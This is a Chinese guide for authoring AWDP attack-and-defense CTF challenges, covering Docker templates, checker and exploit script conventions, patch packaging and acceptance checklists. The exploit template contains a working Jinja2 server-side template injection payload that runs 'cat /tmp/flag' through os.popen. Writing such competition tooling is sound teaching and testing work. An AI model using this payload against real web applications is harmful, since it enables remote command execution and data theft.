# AWDP 题型出题指南

## 题型定义

AWDP（Attack With Defense Plus）：攻防对抗模式。交付的不是单个 Flag 题，而是一套**可持续运行、可攻击、可修补、可检查**的服务。

适用：综合漏洞服务，选手既要攻击别人又要修补自己的服务。

## 平台配置字段

| 字段 | 推荐测试值 | 说明 |
|------|-----------|------|
| 服务名称 | `SSTI Service` | 同一比赛内唯一 |
| 镜像 | 完整 Registry 引用 | 所有目标节点可拉取 |
| 暴露端口 | `80` | 容器内部端口 |
| Checker 入口 | `python3 checker.py` | 30 秒超时 |
| Exp 入口 | `python3 exp.py` | 30 秒超时 |
| 初始分 | `1000` | 服务基础分 |
| 攻击分 | `50` | 每个合法 Flag |
| SLA 分 | `20` | |
| 修补分 | `100` | 修补验证成功 |
| 异常扣分 | `200` | 服务不可用 |
| 每轮最大攻击 | `3` | 每队每服务 |
| 攻击阶段 | `8-10` 分钟 | |
| 修补阶段 | `8-10` 分钟 | |
| 总轮数 | `2`（测试） | |

## 目录结构

```
awdp-category-knowledge-difficulty-v1/
├── README.md
├── statement.md
├── writeup.md
├── flag-policy.md
├── source/
│   ├── app/              # 服务源码
│   └── ...
├── attachments/          # 给选手的附件（如源码包）
│   └── source.zip
├── docker/
│   ├── Dockerfile
│   ├── docker-compose.test.yml
│   └── healthcheck.sh
└── awdp/
    ├── checker.py         # 服务健康检查脚本
    ├── exp.py             # 漏洞利用脚本（验证用）
    └── patch-example/
        └── update.sh      # 选手修补包示例
```

## 服务镜像要求（核心规则）

1. **监听 0.0.0.0:ExposePort**
2. 从 `GZCTF_FLAG` 读取当前轮/队伍 Flag
3. 启动后在合理时间内可用
4. 支持在运行容器中执行 `update.sh` 修补
5. 补丁应用后服务进程能重载或重启
6. 镜像内包含补丁所需的基础命令（`install`, `pkill`, `sed`, `grep` 等）
7. 漏洞必须能被 Exp **稳定复现**
8. Checker 必须验证**核心业务逻辑**，不只检查 TCP 端口

### Docker 构建上下文（极容易出错）

Dockerfile 在 `docker/` 目录下，`docker build -t xxx docker/` 的上下文就是 `docker/`。
**Dockerfile 里的 `COPY` 只能访问 docker/ 目录内的文件！**

创建题目时，必须把源码也放到 docker/ 下：
```bash
# Web 题：源码在 source/，需要拷到 docker/
cp source/app.py docker/
cp source/requirements.txt docker/

# PWN 题：源码在 source/app/，需要拷到 docker/
cp -r source/app/ docker/app/
```

**写完 Dockerfile 后必须验证所有 COPY 路径在 docker/ 下都存在！**

### Web 服务 Dockerfile 模板

```dockerfile
FROM python:3.12-slim
RUN sed -i 's|http://deb.debian.org|http://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list.d/debian.sources
RUN apt-get update && apt-get install -y --no-install-recommends curl && rm -rf /var/lib/apt/lists/*
RUN useradd -r -u 10001 ctf
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
RUN chown -R ctf:ctf /app
COPY start.sh /start.sh
RUN chmod +x /start.sh
HEALTHCHECK --interval=30s --timeout=5s --retries=3 CMD curl -f http://localhost:80/ || exit 1
EXPOSE 80
USER ctf
CMD ["/start.sh"]
```

### PWN 服务 Dockerfile 模板（xinetd + 源码编译）

```dockerfile
FROM ubuntu:22.04
RUN sed -i 's|http://archive.ubuntu.com|http://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list
# 注意：PWN 题需要 build-essential（包含 gcc + make + libc6-dev）
RUN apt-get update && apt-get install -y --no-install-recommends \
    xinetd build-essential netcat-openbsd curl && rm -rf /var/lib/apt/lists/*
RUN groupadd -r ctf && useradd -r -g ctf -u 10001 -m -d /home/ctf ctf
# 从 docker/app/ 编译（app/ 已提前从 source/app/ 复制过来）
COPY app/ /home/ctf/app/
RUN cd /home/ctf/app && make && cp <binary> /home/ctf/ && chmod 755 /home/ctf/<binary> && rm -rf /home/ctf/app
COPY ctf.xinetd /etc/xinetd.d/ctf
RUN chmod 644 /etc/xinetd.d/ctf
RUN touch /flag && chown ctf:ctf /flag && chmod 644 /flag
RUN apt-get update && apt-get install -y sed grep psmisc && rm -rf /var/lib/apt/lists/*
COPY start.sh /start.sh
RUN chmod +x /start.sh
HEALTHCHECK --interval=30s --timeout=5s --retries=3 CMD nc -z localhost 9999 || exit 1
EXPOSE 9999
USER ctf
CMD ["/start.sh"]
```

## Checker 规范

### 环境变量
```
AWDP_TARGET_HOST   # 目标主机
AWDP_TARGET_PORT   # 目标端口
AWDP_FLAG          # 目标服务的 Flag
AWDP_SERVICE_ID    # 服务 ID
AWDP_SERVICE_NAME  # 服务名
AWDP_TEAM_ID       # 队伍 ID
```

### 输出规范
最后一行的**第一个状态词**必须是以下之一：
- `OK`：服务正常
- `MUMBLE`：服务响应异常（返回了非预期内容）
- `DOWN`：服务不可达（连接超时/拒绝）
- `CORRUPT`：Flag 错误或丢失

### Checker 代码模板

```python
#!/usr/bin/env python3
"""AWDP Checker for SSTI Service"""
import os
import sys
import requests

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
flag = os.environ["AWDP_FLAG"]

try:
    # 检查核心业务：health 端点
    response = requests.get(f"http://{host}:{port}/health", timeout=5)
    if response.status_code != 200:
        print(f"MUMBLE unexpected status={response.status_code}")
        sys.exit(0)

    # 检查 Flag 完整性：读取内部 flag-check 端点
    flag_response = requests.get(
        f"http://{host}:{port}/internal/flag-check",
        timeout=5
    )
    if flag not in flag_response.text:
        print("CORRUPT flag storage mismatch")
        sys.exit(0)

    print("OK service and flag are healthy")
except requests.RequestException as exc:
    print(f"DOWN {exc}")
```

### Checker 约定
- 单次运行 5-10 秒内完成
- 所有网络请求设置 `timeout`
- **不输出完整 Flag**
- 输出可定位原因，但不泄漏敏感数据
- 成功退出码为 0；异常使用非 0

## Exp 规范

### 退出码约定
- `0`：漏洞利用成功（漏洞仍存在）→ 攻击者得分
- `非0`：漏洞利用失败（已被修补）→ 攻击者不得分

### Exp 代码模板

```python
#!/usr/bin/env python3
"""AWDP Exp for SSTI Service"""
import os
import sys
import requests

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
expected = os.environ["AWDP_FLAG"]

# SSTI payload
payload = (
    "{{config.__class__.__init__.__globals__"
    "['os'].popen('cat /tmp/flag').read()}}"
)

try:
    response = requests.post(
        f"http://{host}:{port}/render",
        data={"name": payload},
        timeout=5,
    )
except requests.RequestException:
    sys.exit(2)  # 网络错误，非预期

sys.exit(0 if expected in response.text else 1)
```

### Exp 要求
- 稳定、可重复
- 不依赖随机竞争或外部公网服务
- 处理网络异常（timeout、连接拒绝 = 对方已下线或修补）

## 修补包规范

### 格式要求
- 仅接受 `.tar.gz` 或 `.tgz`
- 最大 16 MiB
- 最多 512 个 entry
- 根目录必须包含 `update.sh`

### 禁止项
- 绝对路径
- `..` 路径穿越
- 符号链接和硬链接
- block/character device
- FIFO

### update.sh 模板

```bash
#!/bin/sh
set -eu

install -m 0644 ./files/app.py /app/app.py

if command -v pkill >/dev/null 2>&1; then
    pkill -HUP -f 'python.*app.py' || true
fi

exit 0
```

### 修补包目录结构

```
patch/
├── update.sh
└── files/
    └── app.py
```

### 打包命令

```bash
cd patch
tar -czf ../ssti-fix-v1.tgz update.sh files
tar -tzf ../ssti-fix-v1.tgz   # 验证
```

## 服务设计的安全考虑

1. **Flag 读取端点**：`/internal/flag-check` 仅用于 Checker，不要对选手暴露（可通过内网隔离或认证隔离）
2. **Health 端点**：`/health` 公开可用，返回简单 "OK" 即可
3. **Flag 存储**：写入 `/tmp/flag` 或 `/flag`，确保补丁更新后仍正确
4. **补丁友好**：代码结构清晰，选手容易定位和修补漏洞点

## 验收标准（必须逐条通过）

1. A/B 两队实例都能启动
2. Checker 显示 OK
3. A 队能通过漏洞取得 B 队 Flag
4. A 队提交后得分，重复提交不得分
5. 自己队伍 Flag 被平台拒绝（不能提交自己的 Flag 得分）
6. 修补阶段可上传合法补丁
7. 修补后 Checker 通过（服务仍正常）**且** Exp 失败（漏洞已修复）
8. 修补分计入榜单
9. 停止比赛后实例和端口全部清理
10. 确认运行在支持修补的节点（本地容器后端）

## 构建前检查（必做，每次构建前逐条确认）

1. [ ] `docker/` 目录包含了所有 COPY 需要的文件（app.py, requirements.txt, start.sh 等）
2. [ ] **PWN 题**：`source/app/` 已复制到 `docker/app/`，Makefile 和源码都在
3. [ ] **PWN 题**：Dockerfile 装了 `build-essential`（不是只装 gcc）
4. [ ] **Web 题**：`source/app.py`, `source/requirements.txt` 已复制到 `docker/`
5. [ ] Dockerfile 里有 `USER ctf` 和 `HEALTHCHECK`
6. [ ] docker-compose.test.yml 端口映射用 `0.0.0.0:xxxxx:yyyy`
7. [ ] start.sh 有 `set -eu`，用 `exec` 启动主进程
8. [ ] `/flag` 文件 owner 是 ctf（`chown ctf:ctf /flag`），否则 start.sh 写不进去

## 自检步骤

1. `docker build` → 成功
2. `docker compose up -d` → healthy
3. 模拟 Checker: `AWDP_TARGET_HOST=127.0.0.1 AWDP_TARGET_PORT=18080 AWDP_FLAG=flag{test} python3 checker.py` → 应该输出 OK
4. 模拟 Exp: `AWDP_TARGET_HOST=127.0.0.1 AWDP_TARGET_PORT=18080 AWDP_FLAG=flag{test} python3 exp.py` → 应该 exit 0
5. 制作补丁包并测试：打补丁后 Checker 仍 OK，Exp 返回非 0
6. `docker compose down` → 快速退出
